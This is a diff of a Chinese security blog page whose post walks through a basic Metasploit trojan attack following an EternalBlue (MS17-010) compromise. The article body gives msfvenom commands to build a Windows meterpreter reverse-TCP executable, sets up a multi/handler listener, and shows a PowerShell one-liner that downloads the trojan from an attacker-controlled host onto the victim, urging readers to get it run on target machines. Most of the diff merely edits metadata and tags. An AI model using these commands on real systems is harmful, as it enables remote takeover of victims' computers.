@@ -6,20 +6,25 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="刚刚试了下永恒之蓝，看到有人用木马，也补一下后面的其他环境和那一片的一样  msfvenom模块，首先生成.exe木马文件  1msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.77.0.109 lport&#x3D;4443f exe &gt;&#x2F;root&#x2F;1.exe   1.exe 就是">
+    <meta name="description" content="刚刚试了下永恒之蓝，看到有人用木马，也补一下后面的其他环境和那一片的一样  msfvenom模块，首先生成.exe木马文件  1msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.77.0.109 lport&#x3D;4443f exe &gt;&#x2F;root&#x2F;1.exe  1.exe 就">
 <meta property="og:type" content="article">
 <meta property="og:title" content="MSF木马的简单利用">
 <meta property="og:url" content="https://godzeo.github.io/2019/06/06/MSF%E6%9C%A8%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/index.html">
 <meta property="og:site_name" content="Zeo 安全实验室">
-<meta property="og:description" content="刚刚试了下永恒之蓝，看到有人用木马，也补一下后面的其他环境和那一片的一样  msfvenom模块，首先生成.exe木马文件  1msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.77.0.109 lport&#x3D;4443f exe &gt;&#x2F;root&#x2F;1.exe   1.exe 就是">
+<meta property="og:description" content="刚刚试了下永恒之蓝，看到有人用木马，也补一下后面的其他环境和那一片的一样  msfvenom模块，首先生成.exe木马文件  1msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.77.0.109 lport&#x3D;4443f exe &gt;&#x2F;root&#x2F;1.exe  1.exe 就">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/2019060616093520.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190606161629689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20190606164405347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2019-06-06T09:06:38.000Z">
-<meta property="article:modified_time" content="2020-07-04T09:00:05.267Z">
+<meta property="article:modified_time" content="2020-08-01T08:32:08.663Z">
 <meta property="article:author" content="Zeo">
-<meta property="article:tag" content="MSF木马">
+<meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="二进制">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://img-blog.csdnimg.cn/2019060616093520.png">
     
@@ -54,6 +59,8 @@
     
     <!-- rss -->
     
+    
+      <link rel="alternate" href="/true" title="Zeo 安全实验室" type="application/atom+xml" />
     
 <meta name="generator" content="Hexo 4.2.0"></head>
 
@@ -149,16 +156,11 @@
       
     <div class="article-category">
         <i class="fas fa-archive"></i>
-        <a class="category-link" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a>
+        <a class="category-link" href="/categories/WEB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB漏洞复现和分析</a>
     </div>
 
 
       
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/MSF%E6%9C%A8%E9%A9%AC/" rel="tag">MSF木马</a>
-    </div>
-
 
     </div>
   </header>
@@ -167,15 +169,16 @@
   <div class="content" itemprop="articleBody">
     <a id="more"></a>
 
+
+
 <p>刚刚试了下永恒之蓝，看到有人用木马，也补一下后面的其他<br>环境和那一片的一样</p>
 <ol>
 <li>msfvenom模块，首先生成.exe木马文件</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.77.0.109 lport&#x3D;4443f exe &gt;&#x2F;root&#x2F;1.exe</span><br></pre></td></tr></table></figure>
 
-
 <p>1.exe 就是木马 要把这个用各种方法去受害机运行</p>
-<p><img src="https://img-blog.csdnimg.cn/2019060616093520.png" alt="在这里插入图片描述"><br> 2. 输入msfconsole进入metasploi<br> 3. 进入监听模块</p>
+<p><img src="https://img-blog.csdnimg.cn/2019060616093520.png" alt="在这里插入图片描述"><br>2. 输入msfconsole进入metasploi<br>3. 进入监听模块</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br></pre></td></tr></table></figure>
 
 <ol start="4">
@@ -187,11 +190,14 @@
 <li>设置监听ip端口</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set lhost 10.77.0.109</span><br><span class="line">set lport 4443</span><br><span class="line">要与木马一致</span><br></pre></td></tr></table></figure>
+
 <ol start="6">
 <li>运行<img src="https://img-blog.csdnimg.cn/20190606161629689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>kali这边就准备完了，等待上线</li>
 </ol>
 <h2 id="在目标主机运行-1-exe-木马"><a href="#在目标主机运行-1-exe-木马" class="headerlink" title="在目标主机运行 1.exe 木马"></a>在目标主机运行 1.exe 木马</h2><p>利用是之前的ms17010直接shell</p>
-<pre><code>powershell (new-object System.Net.WebClient).DownloadFile( &apos;http://10.77.0.100/1.exe&apos;,&apos;c:\1.exe&apos;)</code></pre><p><img src="https://img-blog.csdnimg.cn/20190606164405347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上线成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile( &#39;http:&#x2F;&#x2F;10.77.0.100&#x2F;1.exe&#39;,&#39;c:\1.exe&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190606164405347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上线成功</p>
 <p>后续的。。再写</p>
 
   </div>
